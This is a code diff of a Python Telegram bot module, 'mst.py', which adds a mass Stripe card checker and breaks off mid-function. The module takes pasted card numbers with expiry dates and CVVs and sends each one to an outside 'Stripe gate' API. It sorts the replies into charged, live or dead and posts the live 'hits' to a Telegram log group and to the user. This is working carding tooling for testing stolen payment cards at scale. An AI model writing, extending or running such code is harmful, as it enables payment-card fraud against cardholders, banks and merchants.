@@ -1,3 +1,14 @@
+"""
+mst.py — /mst Mass Stripe checker (python-telegram-bot, NO aiogram)
+
+Architecture:
+  • CommandHandler("mst", cmd_mst)
+  • CallbackQueryHandler for "mstr:<sid>:<type>" (download results)
+  • CallbackQueryHandler for "msts:<sid>"         (stop session)
+
+All session state is held in-memory dicts (no database).
+"""
+
 import asyncio
 import random
 import re
@@ -5,1322 +16,654 @@ import logging
 import aiohttp
 import time
 import string
-import os
 from datetime import datetime
-from typing import Optional, Tuple, List
+from typing import Optional, List, Tuple
 from io import BytesIO
 from html import escape as html_escape
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# AIOGRAM IMPORTS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-from aiogram import types, F, Router, Bot
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
-from aiogram.filters.callback_data import CallbackData
+from telegram import Update, InputFile
+from telegram.error import BadRequest, Forbidden
+from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# IN-MEMORY STUBS  (replaces psycopg2 / database / sub / bin modules)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_CREDITS_STORE: dict = {}   # user_id -> int
-_PREMIUM_STORE: dict = {}   # user_id -> {"premium": bool, "plan": str, "expires": float}
-_GATE_ENABLED:  dict = {}   # gate_name -> bool
-
-def get_user_credits(user_id: int) -> int:
-    """Premium users get unlimited; default 999999 so the credit check always passes."""
-    return _CREDITS_STORE.get(user_id, 999999)
-
-def update_credits(user_id: int, new_credits: int) -> None:
-    _CREDITS_STORE[user_id] = max(0, new_credits)
-
-def update_user_stats(user_id: int, *args, **kwargs) -> None:
-    pass  # no-op — stats tracked in main.py's bot_data
-
-def is_gate_enabled(gate: str) -> bool:
-    return _GATE_ENABLED.get(gate, True)
-
-def get_premium_status(user_id: int) -> tuple:
-    """Returns (is_premium, expiry_ts). Defaults premium=True so /mst is usable."""
-    info = _PREMIUM_STORE.get(user_id, {})
-    return info.get("premium", True), info.get("expires", 0)
-
-def set_user_premium(user_id: int, plan: str = "ELITE", expires: float = 0.0) -> None:
-    """Called by main.py PTB system to sync premium status into mst.py."""
-    _PREMIUM_STORE[user_id] = {"premium": True, "plan": plan, "expires": expires}
-
-def set_gate_enabled(gate: str, state: bool) -> None:
-    """Called by main.py to toggle gates."""
-    _GATE_ENABLED[gate] = state
-
-async def get_bin_info(bin6: str) -> dict:
-    """Async BIN lookup via binlist.net."""
-    try:
-        url = f"https://lookup.binlist.net/{bin6[:6]}"
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url, headers={"Accept-Version": "3"}) as resp:
-                if resp.status == 200:
-                    data = await resp.json(content_type=None)
-                    bank    = data.get("bank", {})
-                    country = data.get("country", {})
-                    return {
-                        "scheme":        str(data.get("scheme", "N/A")).upper(),
-                        "type":          str(data.get("type",   "N/A")).upper(),
-                        "bank":          bank.get("name",    "N/A") if isinstance(bank,    dict) else "N/A",
-                        "country":       country.get("name", "N/A") if isinstance(country, dict) else "N/A",
-                        "country_emoji": country.get("emoji","")    if isinstance(country, dict) else "",
-                    }
-    except Exception:
-        pass
-    return {}
+from config import (
+    OWNER_ID, CHANNEL_LINK, DEV_LINK, BOT_NAME,
+    get_bin_info,
+    tg_emoji,
+    PROG_GATE_EMOJI_ID, PROG_PROGRESS_EMOJI_ID,
+    PROG_LIVE_EMOJI_ID, PROG_DEAD_EMOJI_ID, PROG_ERRORS_EMOJI_ID,
+    BTN_ALL_EMOJI_ID, BTN_STOP_EMOJI_ID,
+    CARD_EMOJI_ID, USER_EMOJI_ID, TIME_EMOJI_ID,
+    DEV_EMOJI_ID, PRO_EMOJI_ID, HIT_RESP_EMOJI_ID,
+    get_random_live_emoji, get_plan_emoji_id,
+)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONFIGURATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+HIT_LOG_GROUP_ID         = -1004398328329   # ← set to your hit-log group
+EXTRA_CHARGED_GROUP_ID   = -1003991915326   # ← set to your extra-log group
+STRIPE_GATE_API_URL      = "https://cardx.up.railway.app/stripe/cc={card}"
 
-HIT_LOG_GROUP_ID               = -1004398328329
-EXTRA_CHARGED_GROUP_ID         = -1003991915326
-CHANNEL_LINK                   = "https://t.me/Batcardchk"
-BUTTON_LOCK_SECONDS            = 30
-
-PROGRESS_UPDATE_INTERVAL       = 5.0
-CARDS_PER_PROGRESS_UPDATE      = 10
-SESSION_CLEANUP_SECONDS        = 1800
-COMPLETED_SESSION_KEEP_SECONDS = 86400
-
-MAX_CONCURRENT_CARDS           = 10
-CARD_TIMEOUT_SECONDS           = 180
-
-STRIPE_GATE_API_URL = "https://cardx.up.railway.app/stripe/cc={card}"
-
-MST_SESSIONS           = {}
-MST_COMPLETED_SESSIONS = {}
-MST_SESSION_LOCKS      = {}
-MST_TASKS              = {}
-
-router = Router()
+MAX_CONCURRENT_CARDS     = 10
+CARD_TIMEOUT_SECONDS     = 60
+PROGRESS_UPDATE_INTERVAL = 5.0
+CARDS_PER_UPDATE         = 10
+SESSION_CLEANUP_SECS     = 1800
+COMPLETED_KEEP_SECS      = 86400
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# EMOJI IDS  — msh.py style
+# IN-MEMORY USER STORE  (no database / psycopg2)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+_CREDITS: dict = {}   # user_id -> int
+_PREMIUM: dict = {}   # user_id -> bool
 
-DECLINED_EMOJI_ID = "4956612582816351459"
-CARD_EMOJI_ID     = "5800709991627232190"
-USER_EMOJI_ID     = "4958689671950369798"
-TIME_EMOJI_ID     = "5382194935057372936"
-DEV_EMOJI_ID      = "6267091732861555879"
-PRO_EMOJI_ID      = "6298678524379137990"
-
-# Hit-log emojis
-HIT_RESP_EMOJI_ID = "5839116473951328489"
-
-# Progress-message emojis
-PROG_GATE_EMOJI_ID     = "5341715473882955310"
-PROG_PROGRESS_EMOJI_ID = "5258113901106580375"
-PROG_LIVE_EMOJI_ID     = "5427168083074628963"
-PROG_DEAD_EMOJI_ID     = "4958526153955476488"
-PROG_ERRORS_EMOJI_ID   = "4956611513369494230"
-
-# Button emoji IDs
-BTN_ALL_EMOJI_ID  = "4956324463525233747"
-BTN_STOP_EMOJI_ID = "6179444193518162239"
-
-# Pool of live emoji IDs (random one shown per live hit)
-LIVE_EMOJI_IDS = [
-    "5801154993188770160", "4956739572114392015", "5285221724634239278",
-    "5287777298894835685", "5285024405246725814", "5287547831677112267",
-    "5287658362660474522", "5285186510197381130", "5803233241963959320",
-    "5462902520215002477", "5787435351521889877", "5323674506705785412",
-    "5801005158959683238", "5436143465211640305", "5800688138833629633",
-    "5891044423856296980", "5436068999068662274", "5427168083074628963",
-]
+def _credits(uid: int)            -> int:  return _CREDITS.get(uid, 999999)
+def _set_credits(uid: int, n: int) -> None: _CREDITS[uid] = max(0, n)
+def _is_premium(uid: int)          -> bool: return _PREMIUM.get(uid, True)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PLAN EMOJIS
+# SESSION STORAGE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+MST_SESSIONS:   dict = {}
+MST_COMPLETED:  dict = {}
+MST_TASKS:      dict = {}
 
-PLAN_EMOJIS = {
-    "CORE":  "5379869575338812919",
-    "ELITE": "5836898273666798437",
-    "ROOT":  "4956420911310832630",
-    "CUSTOM": "5445027583588593750" ,
-}
+def _sess(sid: str) -> Optional[dict]:
+    return MST_SESSIONS.get(sid) or MST_COMPLETED.get(sid)
 
-SPECIAL_FONT_MAP = {
-    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
-    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
-    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
-    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
-    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
-    'ᴢ': 'Z', 'Ɪ': 'I',
-}
+def _stopped(sid: str) -> bool:
+    s = MST_SESSIONS.get(sid)
+    return (not s) or s.get("status") == "STOPPED"
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# STATUS MAPPINGS
+# CARD RESPONSE CLASSIFIER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+CHARGED_KW = ["charged","payment_intent.succeeded","amount_captured",
+               "captured successfully","payment captured","charge succeeded",
+               "order placed","order confirmed","payment successful"]
+LIVE_KW    = ["approved","success","true","live","authenticated",
+               "authentication successful","thank you"]
+DEAD_KW    = ["declined","do_not_honor","insufficient funds","card declined",
+               "blocked","stolen","lost","expired","security violation",
+               "restricted","not permitted","fraud","invalid card","cvv"]
+RETRY_KW   = ["connection error","timeout","socket","ssl","rate limit",
+               "too many requests","service unavailable","gateway timeout"]
 
-STATUS_APPROVED = "approved"   # API value — do not change
-STATUS_DECLINED = "declined"
-STATUS_ERROR    = "error"
-STATUS_TIMEOUT  = "timeout"
-
-STATUS_DISPLAY_MAP = {
-    STATUS_APPROVED: "Live ✅",
-    STATUS_DECLINED: "Declined ❌",
-    STATUS_ERROR:    "Error ⚠️",
-    STATUS_TIMEOUT:  "Timeout ⏱️",
-}
-
-ERROR_STATUSES    = {STATUS_ERROR, STATUS_TIMEOUT}
-HIT_STATUSES      = {STATUS_APPROVED}
-DECLINED_STATUSES = {STATUS_DECLINED}
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CALLBACK DATA
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-class MstResultCallback(CallbackData, prefix="mstr"):
-    session_id:  str
-    result_type: str
-
-class MstStopCallback(CallbackData, prefix="msts"):
-    session_id: str
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# TELEGRAM RATE LIMITERS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-class TelegramRateLimiter:
-    def __init__(self, min_interval: float = 1.0, max_burst: int = 3):
-        self.min_interval      = min_interval
-        self.max_burst         = max_burst
-        self._last_send_time   = 0.0
-        self._burst_count      = 0
-        self._burst_reset_time = 0.0
-        self._lock             = asyncio.Lock()
-
-    async def wait_if_needed(self):
-        async with self._lock:
-            now = time.time()
-            if now - self._burst_reset_time > 5.0:
-                self._burst_count      = 0
-                self._burst_reset_time = now
-            delay = 2.0 if self._burst_count >= self.max_burst else max(0, self.min_interval - (now - self._last_send_time))
-            if delay > 0:
-                await asyncio.sleep(delay)
-            self._last_send_time = time.time()
-            self._burst_count   += 1
-
-HIT_LOG_RATE_LIMITER     = TelegramRateLimiter(min_interval=1.0, max_burst=3)
-USER_DM_RATE_LIMITER     = TelegramRateLimiter(min_interval=1.0, max_burst=3)
-EXTRA_GROUP_RATE_LIMITER = TelegramRateLimiter(min_interval=1.0, max_burst=3)
-PROGRESS_UPDATE_LIMITER  = TelegramRateLimiter(min_interval=0.5, max_burst=10)
+def _classify(resp: str) -> str:
+    low = resp.lower()
+    for k in CHARGED_KW:
+        if k in low: return "CHARGED"
+    for k in LIVE_KW:
+        if k in low: return "LIVE"
+    for k in DEAD_KW:
+        if k in low: return "DEAD"
+    for k in RETRY_KW:
+        if k in low: return "RETRY"
+    return "DEAD"
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _safe(t) -> str:
+    return html_escape(str(t)) if t else "N/A"
 
-def safe_html(text: str) -> str:
-    if not text:
-        return "N/A"
-    return html_escape(str(text))
+def _user_link(user) -> str:
+    name = _safe(user.first_name or "User")
+    if user.username:
+        return f'<a href="https://t.me/{user.username}">{name}</a>'
+    return f'<a href="tg://user?id={user.id}">{name}</a>'
 
-def get_random_live_emoji() -> str:
-    return random.choice(LIVE_EMOJI_IDS)
-
-def get_plan_emoji_id(plan_name: str) -> str:
-    if not plan_name:
-        return PRO_EMOJI_ID
-    normalized = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
-    if normalized in PLAN_EMOJIS:
-        return PLAN_EMOJIS[normalized]
-    for key, eid in PLAN_EMOJIS.items():
-        if key in normalized:
-            return eid
-    return PRO_EMOJI_ID
-
-def get_status_display(status: str) -> str:
-    return STATUS_DISPLAY_MAP.get(status.lower(), "Unknown ❓")
-
-def build_user_link(user_obj) -> str:
-    name = safe_html(user_obj.first_name or "User")
-    if user_obj.username:
-        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
-    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'
-
-def log_hit_to_mst(user_id, username, first_name):
-    try:
-        with open("mst.txt", "a", encoding="utf-8") as f:
-            u_name = username if username else "None"
-            f_name = first_name if first_name else "Unknown"
-            f.write(f"{user_id}|{u_name}|{f_name}\n")
-    except Exception as e:
-        logging.error(f"Error writing to mst.txt: {e}")
-
-def is_session_stopped(session_id: str) -> bool:
-    session = MST_SESSIONS.get(session_id)
-    if not session: return True
-    return session.get('status') == "STOPPED"
-
-def is_buttons_locked(session_id: str) -> bool:
-    session = MST_SESSIONS.get(session_id)
-    if not session:
-        completed = MST_COMPLETED_SESSIONS.get(session_id)
-        if not completed: return False
-        return False
-    elapsed = time.time() - session.get('start_time', 0)
-    return elapsed < BUTTON_LOCK_SECONDS
-
-def get_remaining_lock(session_id: str) -> int:
-    session = MST_SESSIONS.get(session_id)
-    if not session: return 0
-    elapsed   = time.time() - session.get('start_time', 0)
-    remaining = BUTTON_LOCK_SECONDS - elapsed
-    return max(0, int(remaining) + 1)
-
-def get_session_data(session_id: str) -> Optional[dict]:
-    session = MST_SESSIONS.get(session_id)
-    if session: return session
-    return MST_COMPLETED_SESSIONS.get(session_id)
-
-def luhn_check(card_number: str) -> bool:
-    card_number = str(card_number).strip()
-    if not card_number.isdigit(): return False
+def _luhn(n: str) -> bool:
+    if not n.isdigit(): return False
     total = 0
-    reverse_digits = card_number[::-1]
-    for i, char in enumerate(reverse_digits):
-        digit = int(char)
+    for i, c in enumerate(n[::-1]):
+        d = int(c)
         if i % 2 == 1:
-            digit *= 2
-            if digit > 9: digit -= 9
-        total += digit
+            d *= 2
+            if d > 9: d -= 9
+        total += d
     return total % 10 == 0
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CARD EXTRACTION
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def extract_cards_from_text(text: str) -> List[str]:
+def _parse_cards(text: str) -> List[Tuple[str,str]]:
     patterns = [
         r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
         r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
         r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
-        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
-        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
-        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
-        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
-        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
     ]
-    cards = []
-    for pattern in patterns:
-        matches = re.findall(pattern, text)
-        for match in matches:
-            if len(match) == 4:
-                card_number, month, year, cvv = match
-                month = month.zfill(2)
-                if len(year) == 4: year = year[2:]
-                card_string = f"{card_number}|{month}|{year}|{cvv}"
-                if card_string not in cards:
-                    cards.append(card_string)
+    seen = set(); cards = []
+    for pat in patterns:
+        for m in re.findall(pat, text):
+            cc, mm, yy, cvv = m
+            mm = mm.zfill(2)
+            if len(yy) == 4: yy = yy[2:]
+            fmt = f"{cc}|{mm}|{yy}|{cvv}"
+            if fmt not in seen and _luhn(cc):
+                seen.add(fmt); cards.append((fmt, cc))
     return cards
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PLAN FETCHING
+# RATE LIMITER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+class _RL:
+    def __init__(self, interval=1.0, burst=3):
+        self._interval = interval; self._burst = burst
+        self._last = 0.0; self._cnt = 0; self._reset = 0.0
+        self._lock = asyncio.Lock()
+    async def wait(self):
+        async with self._lock:
+            now = time.time()
+            if now - self._reset > 5.0:
+                self._cnt = 0; self._reset = now
+            delay = 2.0 if self._cnt >= self._burst else max(0, self._interval-(now-self._last))
+            if delay: await asyncio.sleep(delay)
+            self._last = time.time(); self._cnt += 1
 
-async def get_user_plan_info(user_id):
-    """Returns (plan_name, plan_emoji_id) from in-memory premium store."""
-    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
-    if is_premium:
-        info      = _PREMIUM_STORE.get(user_id, {})
-        plan_name = info.get("plan", "ELITE").upper()
-        if plan_name not in ("CORE", "ELITE", "ROOT", "CUSTOM"):
-            plan_name = "ELITE"
-        plan_emoji_id = get_plan_emoji_id(plan_name)
-        return plan_name, plan_emoji_id
-    return "TRIAL", PRO_EMOJI_ID
+_RL_HIT  = _RL(1.0, 3)
+_RL_DM   = _RL(1.0, 3)
+_RL_PROG = _RL(0.5, 10)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# STRIPE GATE API
+# STRIPE API
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-async def check_stripe_gate(card: str) -> dict:
+async def _stripe(card: str) -> dict:
     url = STRIPE_GATE_API_URL.format(card=card)
     try:
-        timeout = aiohttp.ClientTimeout(total=CARD_TIMEOUT_SECONDS)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as response:
-                if response.status == 200:
-                    data = await response.json()
-                    return {
-                        "status":   data.get("status", "error").lower(),
-                        "response": data.get("response", "Unknown Error")
-                    }
-                else:
-                    logging.error(f"[MST] API returned HTTP {response.status}")
-                    return {"status": "error", "response": f"API Error (HTTP {response.status})"}
+        async with aiohttp.ClientSession(
+            timeout=aiohttp.ClientTimeout(total=CARD_TIMEOUT_SECONDS)
+        ) as s:
+            async with s.get(url) as r:
+                if r.status == 200:
+                    data = await r.json()
+                    return {"status": data.get("status","error").lower(),
+                            "response": data.get("response","Unknown")}
+                return {"status":"error","response":f"HTTP {r.status}"}
     except asyncio.TimeoutError:
-        logging.error(f"[MST] API Request Timed Out for {card[:6]}****")
-        return {"status": "error", "response": "Connection Timed Out"}
-    except aiohttp.ClientError as e:
-        logging.error(f"[MST] API Connection Error: {e}")
-        return {"status": "error", "response": f"Connection Failed: {str(e)[:50]}"}
+        return {"status":"error","response":"Connection Timed Out"}
     except Exception as e:
-        logging.error(f"[MST] Unexpected API Error: {e}")
-        return {"status": "error", "response": "Unexpected Error"}
+        return {"status":"error","response":f"Connection Error: {str(e)[:50]}"}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SESSION CLEANUP
+# KEYBOARD BUILDERS  (raw dicts — coloured buttons)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _kb_running(sid: str, checked: int) -> dict:
+    return {"inline_keyboard": [
+        [{"text": f"📋 All ({checked})", "callback_data": f"mstr:{sid}:all",
+          "style": "primary", "icon_custom_emoji_id": BTN_ALL_EMOJI_ID}],
+        [{"text": "🛑 Stop", "callback_data": f"msts:{sid}",
+          "style": "danger",  "icon_custom_emoji_id": BTN_STOP_EMOJI_ID}],
+    ]}
 
-_cleanup_task_started = False
-
-async def _start_cleanup_if_needed():
-    global _cleanup_task_started
-    if not _cleanup_task_started:
-        _cleanup_task_started = True
-        asyncio.create_task(session_cleanup_task())
-
-async def session_cleanup_task():
-    while True:
-        try:
-            await asyncio.sleep(60)
-            current_time = time.time()
-
-            active_to_remove = []
-            for session_id, session in list(MST_SESSIONS.items()):
-                if session.get('status') in ["FINISHED", "STOPPED"]:
-                    end_time = session.get('end_time') or session.get('start_time') or current_time
-                    try:
-                        end_time_float = float(end_time)
-                    except (TypeError, ValueError):
-                        end_time_float = current_time
-                    if current_time - end_time_float > SESSION_CLEANUP_SECONDS:
-                        active_to_remove.append(session_id)
-
-            for session_id in active_to_remove:
-                logging.info(f"[MST] Moving active session to completed: {session_id}")
-                session = MST_SESSIONS.get(session_id)
-                if session:
-                    MST_COMPLETED_SESSIONS[session_id] = {
-                        'user_id':     session.get('user_id'),
-                        'chat_id':     session.get('chat_id'),
-                        'msg_id':      session.get('msg_id'),
-                        'user_msg_id': session.get('user_msg_id'),
-                        'total':       session.get('total', 0),
-                        'checked':     session.get('checked', 0),
-                        'live':        session.get('live', 0),
-                        'dead':        session.get('dead', 0),
-                        'errors':      session.get('errors', 0),
-                        'status':      session.get('status'),
-                        'end_time':    session.get('end_time') or current_time,
-                        'live_cards':  session.get('live_cards', []),
-                        'dead_cards':  session.get('dead_cards', []),
-                        'error_cards': session.get('error_cards', []),
-                        'user_obj':    session.get('user_obj'),
-                        'plan_name':   session.get('plan_name', 'TRIAL'),
-                        'completed_at': current_time
-                    }
-                MST_SESSIONS.pop(session_id, None)
-                MST_SESSION_LOCKS.pop(session_id, None)
-                MST_TASKS.pop(session_id, None)
-
-            completed_to_remove = []
-            for session_id, session in list(MST_COMPLETED_SESSIONS.items()):
-                completed_at = session.get('completed_at') or current_time
-                try:
-                    completed_at_float = float(completed_at)
-                except (TypeError, ValueError):
-                    completed_at_float = current_time
-                if current_time - completed_at_float > COMPLETED_SESSION_KEEP_SECONDS:
-                    completed_to_remove.append(session_id)
-
-            for session_id in completed_to_remove:
-                logging.info(f"[MST] Removing old completed session: {session_id}")
-                MST_COMPLETED_SESSIONS.pop(session_id, None)
-
-        except asyncio.CancelledError:
-            break
-        except Exception as e:
-            logging.error(f"[MST] Error in cleanup task: {e}", exc_info=True)
+def _kb_done(sid: str, live: int, dead: int) -> dict:
+    total = live + dead
+    rows  = []
+    row1  = []
+    if live: row1.append({"text": f"✅ Live ({live})", "callback_data": f"mstr:{sid}:live",
+                           "style": "primary", "icon_custom_emoji_id": BTN_STOP_EMOJI_ID})
+    row1.append({"text": f"📋 All ({total})", "callback_data": f"mstr:{sid}:all",
+                 "style": "primary", "icon_custom_emoji_id": BTN_ALL_EMOJI_ID})
+    rows.append(row1)
+    return {"inline_keyboard": rows}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# RESULT FILE GENERATION
+# PROGRESS TEXT
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
-    if result_type == "live":
-        cards_list, type_label = session.get('live_cards', []), "Live"
-    elif result_type == "dead":
-        cards_list, type_label = session.get('dead_cards', []),  "Dead"
-    else:
-        cards_list = (
-            session.get('live_cards', []) + session.get('dead_cards', []) +
-            session.get('error_cards', [])
-        )
-        type_label = "All"
-
-    name  = (user_obj.first_name or "User") if user_obj else "User"
-    lines = [
-        f"Gate ➳ Stripe | 0$",
-        f"Result ➳ {type_label}",
-        f"Total ➳ {len(cards_list)}",
-        "━━━━━━━━━━━━━━",
-    ]
-
-    for card_data in cards_list:
-        cc            = card_data.get('card', 'N/A')
-        response      = card_data.get('response', 'N/A')
-        actual_status = card_data.get('status', 'unknown').lower()
-        status        = get_status_display(actual_status)
-        bin_info      = card_data.get('bin_info', {})
-        scheme        = bin_info.get('scheme', 'N/A')
-        bank          = bin_info.get('bank', 'N/A')
-        country       = bin_info.get('country', 'N/A')
-        flag          = bin_info.get('country_emoji', '')
-        country_display = f"{flag} {country}" if flag else country
-
-        lines += [
-            f"Card ➳ {cc}",
-            f"Status ➳ {status}",
-            f"Gate ➳ Stripe | 0$",
-            f"Resp ➳ {response}",
-            f"Brand ➳ {scheme}",
-            f"Issuer ➳ {bank}",
-            f"Country ➳ {country_display}",
-            f"User ➳ {name} ({plan_name})",
-            f"Pro ➳ Batamanchk",
-            "━━━━━━━━━━━━━━",
-        ]
-
-    content     = "\n".join(lines)
-    file_buffer = BytesIO(content.encode('utf-8'))
-    file_buffer.seek(0)
-    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    type_map  = {"live": "LIVE", "dead": "DEAD", "all": "ALL"}
-    filename  = f"BATAMANCHK_STRIPE_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
-    return file_buffer, filename, len(cards_list)
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# HIT LOG TO GROUP  (msh.py style)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-async def send_hit_log_to_group(bot: Bot, response_msg: str, user_obj, plan_name: str):
-    await HIT_LOG_RATE_LIMITER.wait_if_needed()
-    user_link     = build_user_link(user_obj)
-    plan_emoji_id = get_plan_emoji_id(plan_name)
-    live_emoji_id = get_random_live_emoji()
-    safe_resp     = safe_html(response_msg)
-
-    status_line = (
-        f'<b><a href="{CHANNEL_LINK}">[❆]</a> LIVE '
-        f'<tg-emoji emoji-id="{live_emoji_id}">✅</tg-emoji></b>'
-    )
-    gate_line = '<b>Stripe • 0$</b>'
-    resp_line = (
-        f'<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji> '
-        f'{safe_resp}</b>'
-    )
-
-    caption = (
-        f'{status_line}\n'
-        f'<b>────────────</b>\n'
-        f'{gate_line}\n'
-        f'{resp_line}\n'
-        f'<b>────────────</b>\n'
-        f'<b>{user_link} '
-        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
-    )
-    try:
-        await bot.send_message(
-            chat_id=HIT_LOG_GROUP_ID, text=caption,
-            parse_mode="HTML", disable_web_page_preview=True
-        )
-    except Exception as e:
-        logging.error(f"[MST] Error sending hit log: {e}")
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# HIT DM TO USER  (msh.py style, replies to command)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def _build_hit_dm(
-    cc_formatted: str, response_msg: str, bin_data: dict,
-    elapsed_s: float, user_obj, plan_name: str
-) -> str:
-    bin_scheme    = bin_data.get("scheme", "N/A")
-    bin_bank      = bin_data.get("bank", "N/A")
-    country_name  = bin_data.get("country", "N/A")
-    country_flag  = bin_data.get("country_emoji", "")
-    bin_country   = f"{country_flag} {country_name}" if country_flag else country_name
-    bin_info_str  = safe_html(f"{bin_scheme} - {bin_bank} - {bin_country}")
-    plan_emoji_id = get_plan_emoji_id(plan_name)
-    user_link     = build_user_link(user_obj)
-    dev_link      = '<a href="https://t.me/Batcardchk">Batamanchk</a>'
-    safe_resp     = safe_html(response_msg)
-    live_emoji_id = get_random_live_emoji()
-    time_str      = f"{int(elapsed_s)}s" if elapsed_s < 60 else f"{int(elapsed_s//60)}m {int(elapsed_s%60)}s"
-
-    status_line = (
-        f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
-        f'<tg-emoji emoji-id="{live_emoji_id}">✅</tg-emoji></b>'
-    )
-
-    return (
-        f'{status_line}\n'
-        f'\n'
-        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
-        f'<b>   ⤷ <code>{cc_formatted}</code></b>\n'
-        f'<b>Gate ➳ Stripe | 0$</b>\n'
-        f'<b>──────────</b>\n'
-        f'<b>Resp ➳ {safe_resp}</b>\n'
-        f'<b>Bin ➳ <code>{bin_info_str}</code></b>\n'
-        f'<b>──────────</b>\n'
